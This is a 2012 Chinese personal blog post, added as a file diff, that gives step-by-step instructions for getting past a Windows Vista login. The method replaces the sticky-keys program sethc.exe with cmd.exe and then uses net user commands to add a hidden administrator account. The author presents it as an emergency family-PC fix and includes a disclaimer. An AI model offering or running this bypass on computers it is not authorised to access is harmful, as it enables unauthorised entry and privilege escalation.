@@ -1,0 +1,37 @@
+---
+title: 黑进windows
+excerpt: "今天家里人出门了，但是我要用一台有密码的vista机扫描卷子。怎么办呢？黑进去吧！\r\n\r\n用手机查了十分钟，找到一个办法，于是打算记录下来。（我了个去，还是写个免责声明好。见文末。）\r\n\r\n我将假设你已经知道：\r\n<ul>\r\n\t<li>什么是『windows安装盘』</li>\r\n\t<li>什么是、如何大致使用<code>cmd</code></li>\r\n</ul>\r\n<div>步骤：</div>\r\n<ol>\r\n\t<li>弄个windows安装盘。</li>\r\n\t<li>启动，见到『现在安装』按钮按<code>shift+f1</code>0。</li>\r\n\t<li><code>cd</code>进入<code>c:\\windows\\system32\\</code>。"
+wordpress_id: 349
+wordpress_url: http://blog.easoncxz.com/?p=349
+date: '2012-10-04 15:05:28 +1300'
+date_gmt: '2012-10-04 03:05:28 +1300'
+categories:
+- User
+tags:
+- Windows
+- crack
+comments: []
+---
+<p>今天家里人出门了，但是我要用一台有密码的vista机扫描卷子。怎么办呢？黑进去吧！</p>
+<p>用手机查了十分钟，找到一个办法，于是打算记录下来。（我了个去，还是写个免责声明好。见文末。）</p>
+<p>我将假设你已经知道：</p>
+<ul>
+<li>什么是『windows安装盘』</li>
+<li>什么是、如何大致使用<code>cmd</code></li>
+</ul>
+<div>步骤：</div>
+<ol>
+<li>弄个windows安装盘。</li>
+<li>启动，见到『现在安装』按钮按<code>shift+f1</code>0。</li>
+<li><code>cd</code>进入<code>c:\windows\system32\</code>。<a id="more"></a><a id="more-349"></a></li>
+<li>对粘滞键程序改名： <code>ren sethc.exe sethc-bak.exe</code></li>
+<li>复制假粘滞键程序： <code>copy cmd.exe sethc.exe</code></li>
+<li>拔安装盘，重启。</li>
+<li>见到登录界面，连按5下<code>shift</code>。</li>
+<li>创建新的用户：<code>net user myNewTempUser /add</code></li>
+<li>将这个用户添加到管理员组： <code>net localgroup /add administrators myNewTempUser</code></li>
+<li>重启，搞定。</li>
+</ol>
+<p>当然，出于尽量不要打搅别人的态度，我用完之后还把临时用户删掉了： <code>net user myNewTempUser /delete</code> , 并且重新进入WinPE把粘滞键的文件恢复原样。</p>
+<p><strong>免责声明：</strong><br />
+<strong>本文只希望分享一个紧急情况下进入windows系统的方法，而并不希望以此怂恿或帮助任何人恶意进入他人系统。未经允许使用他人电脑者需要对其自身的行为负责。</strong></p>
